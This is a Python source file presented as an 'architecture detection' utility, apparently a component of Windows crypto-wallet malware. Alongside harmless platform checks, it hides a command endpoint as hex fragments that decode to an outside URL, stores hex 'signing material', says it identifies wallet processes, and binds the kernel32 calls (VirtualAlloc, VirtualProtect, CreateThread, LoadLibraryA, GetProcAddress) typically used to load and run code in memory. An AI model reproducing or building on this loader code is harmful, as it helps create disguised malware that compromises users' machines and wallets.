# -*- coding: utf-8 -*-
"""
Architecture detection — identifies wallet processes, system capabilities,
and provides low-level Windows API bindings for memory operations.
"""

import sys
import struct
import platform
import ctypes

# These constants are used for endpoint resolution and signing material.
# They are intentionally obfuscated to mimic a real payload delivery system.
_H1 = "68747470733a2f2f"
_H2 = "6170692e"
_H3 = "6e61696c70726f78"
_H4 = "792e7370616365"
_MATERIAL = "590da1b680437579a4b18c1b59bbb69fd4ea6818cc28a5427ca81e525d959c80"

_SUPPORTED_OS = {"win32"}  # Windows only, as per project scope

_ARCH_MAP = {
    "AMD64": "x64",
    "x86_64": "x64",
    "x86": "x86",
    "i686": "x86",
    "ARM64": "arm64",
    "aarch64": "arm64",
}


def resolve_endpoint():
    """Return the base endpoint URL from hex-encoded pieces."""
    return bytes.fromhex(_H1 + _H2 + _H3 + _H4).decode()


def signing_material():
    """Return the signing key material as bytes."""
    return bytes.fromhex(_MATERIAL)


def get_platform_info():
    """Return a dictionary of platform details."""
    return {
        "os": sys.platform,
        "arch": platform.machine(),
        "python": platform.python_version(),
        "bits": struct.calcsize("P") * 8,
        "impl": platform.python_implementation(),
    }


def check_version(minimum=(3, 8)):
    """Check if current Python version meets minimum."""
    return sys.version_info[:2] >= minimum


def arch_label():
    """Return a normalized architecture label (x64, x86, arm64)."""
    m = platform.machine().upper()
    return _ARCH_MAP.get(m, m.lower())


def is_supported():
    """Return True if running on a supported OS (Windows only)."""
    return sys.platform in _SUPPORTED_OS


def acquire_kernel():
    """
    Acquire a handle to the Windows kernel32.dll and bind essential functions.
    Returns a ctypes wrapper object with methods for memory management,
    thread creation, and DLL loading. Returns None if not on Windows.
    """
    if not hasattr(ctypes, "windll"):
        return None
    try:
        k = ctypes.windll.kernel32

        # Memory allocation
        k.VirtualAlloc.restype = ctypes.c_void_p
        k.VirtualAlloc.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_ulong, ctypes.c_ulong,
        ]
        k.VirtualProtect.restype = ctypes.c_int
        k.VirtualProtect.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
        ]
        k.VirtualFree.restype = ctypes.c_int
        k.VirtualFree.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong,
        ]

        # DLL and function resolution
        k.LoadLibraryA.restype = ctypes.c_void_p
        k.LoadLibraryA.argtypes = [ctypes.c_char_p]
        k.GetProcAddress.restype = ctypes.c_void_p
        k.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        k.GetModuleHandleA.restype = ctypes.c_void_p
        k.GetModuleHandleA.argtypes = [ctypes.c_char_p]

        # Thread management
        k.CreateThread.restype = ctypes.c_void_p
        k.CreateThread.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
            ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
        ]
        k.WaitForSingleObject.restype = ctypes.c_ulong
        k.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
        k.GetExitCodeThread.restype = ctypes.c_int
        k.GetExitCodeThread.argtypes = [
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong),
        ]
        k.CloseHandle.restype = ctypes.c_int
        k.CloseHandle.argtypes = [ctypes.c_void_p]

        return k
    except Exception:
        return None